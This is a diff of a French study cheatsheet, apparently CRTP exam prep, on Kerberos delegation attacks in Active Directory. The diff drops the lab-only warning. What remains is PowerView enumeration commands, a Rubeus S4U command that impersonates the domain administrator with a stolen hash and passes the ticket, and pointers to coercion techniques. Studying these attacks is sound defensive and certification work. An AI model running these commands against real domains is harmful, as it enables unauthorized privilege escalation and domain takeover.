@@ -1,65 +1,26 @@
 # Cheatsheet - Delegation attacks
 
 > [!summary] Objectif
-> Vérifier rapidement les prérequis delegation vus dans le PDF : unconstrained, constrained et comptes/machines concernés.
+> Détecter et abuser les délégations Kerberos. Ne jamais mélanger les 4 cas : unconstrained / constrained user / constrained computer / RBCD.
 
-> [!warning] Cadre d'utilisation
-> À utiliser uniquement dans un environnement de lab autorisé, dans le cadre de l'apprentissage et de la préparation CRTP.
-
-## Quick use
-
-- Unconstrained delegation
-- Constrained delegation
-- user vs computer delegation
-
-## Core commands
-
-### Unconstrained delegation
-
+### Find unconstrained delegation
 ```powershell
 . C:\AD\Tools\PowerView.ps1
 Get-DomainComputer -Unconstrained | Select-Object -ExpandProperty Name
 ```
 
-Le PDF l’utilise pour trouver le serveur pivot avant la suite des actions Kerberos.
-
-### Constrained delegation - users
-
+### Find constrained delegation
 ```powershell
 Get-DomainUser -TrustedToAuth
-Get-DomainUser -LDAPFilter "(msDS-AllowedToDelegateTo=*)"
-```
-
-Repère les comptes user portant les attributs utiles.
-
-### Constrained delegation - computers
-
-```powershell
 Get-DomainComputer -TrustedToAuth
-Get-ADComputer -Filter * -Properties msds-allowedtodelegateto | Where-Object {$_.msds-allowedtodelegateto}
 ```
 
-Repère les machines avec delegation configurée.
-
-### Abuse path reminder
-
-```text
-PDF topics to chain after enumeration:
-- Rubeus s4u
-- monitor / target DC$
-- RBCD if machine control is available
+### Abuse constrained (S4U)
+```powershell
+Rubeus.exe s4u /user:<svc> /rc4:<hash> /impersonateuser:administrator /msdsspn:<spn> /altservice:<svc> /ptt
 ```
 
-Cette fiche sert surtout à préparer la phase suivante, pas à la mélanger avec tout le reste.
-
-## PDF notes
-
-- Toujours séparer `Unconstrained`, `Constrained user`, `Constrained computer`, `RBCD`.
-- `Get-DomainComputer -Unconstrained` et `Get-DomainUser -TrustedToAuth` sont les deux commandes à retenir en premier.
+> [!note] Deux commandes à retenir d'abord : `Get-DomainComputer -Unconstrained` et `Get-DomainUser -TrustedToAuth`. Coercition (Printer Bug / MS-WSP / MS-DFSNM) et abus unconstrained → [[1. Cheatsheet - Toutes les commandes]].
 
 ## Related
-
-- [[Cheatsheet - RBCD]]
-- [[Cheatsheet - Trusts et forêts]]
-- [[Synthèse - Kerberos]]
-
+[[Cheatsheet - RBCD]] · [[Cheatsheet - Trusts et forêts]] · [[Synthèse - Kerberos]]
